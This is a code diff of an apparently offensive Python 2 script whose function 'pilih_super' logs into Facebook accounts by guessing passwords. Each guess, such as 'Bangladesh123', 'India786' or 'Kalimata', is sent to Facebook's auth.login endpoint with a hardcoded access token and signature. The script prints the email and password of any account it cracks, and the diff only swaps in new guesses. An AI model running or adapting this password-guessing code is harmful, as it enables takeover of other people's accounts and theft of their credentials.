@@ -443,7 +443,7 @@ def pilih_super():
                             	            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
                                         else:
                             	            # Password Guess 6
-                            	            pass6 = 'Pakistan'
+                            	            pass6 = ('Bangladesh') 
                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                             u = json.load(data)
                                             if 'access_token' in u:
@@ -506,7 +506,7 @@ def pilih_super():
                             	                                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass12
                                                                     else:
                             	                                        # Password Guess 13
-                            	                                        pass13 = 'Bangladesh123' 
+                            	                                        pass13 = ('Bangladesh123') 
                                                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                         u = json.load(data)
                                                                         if 'access_token' in u:
@@ -515,7 +515,7 @@ def pilih_super():
                             	                                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass13
                                                                         else:
                             	                                            # Password Guess 14
-                            	                                            pass14 = 'Bangladesh786'
+                            	                                            pass14 = ('Bangladesh786') 
                                                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                             u = json.load(data)
                                                                             if 'access_token' in u:
@@ -664,7 +664,7 @@ def pilih_super():
                             	            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
                                         else:
                             	            # Password Guess 6
-                            	            pass6 = 'Pakistan'
+                            	            pass6 = ('Kalimata') 
                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                             u = json.load(data)
                                             if 'access_token' in u:
@@ -727,7 +727,7 @@ def pilih_super():
                             	                                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass12
                                                                     else:
                             	                                        # Password Guess 13
-                            	                                        pass13 = 'India123' 
+                            	                                        pass13 = ('India123') 
                                                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                         u = json.load(data)
                                                                         if 'access_token' in u:
@@ -736,7 +736,7 @@ def pilih_super():
                             	                                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass13
                                                                         else:
                             	                                            # Password Guess 14
-                            	                                            pass14 = 'India786' 
+                            	                                            pass14 = ('India786') 
                                                                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                             u = json.load(data)
                                                                             if 'access_token' in u:
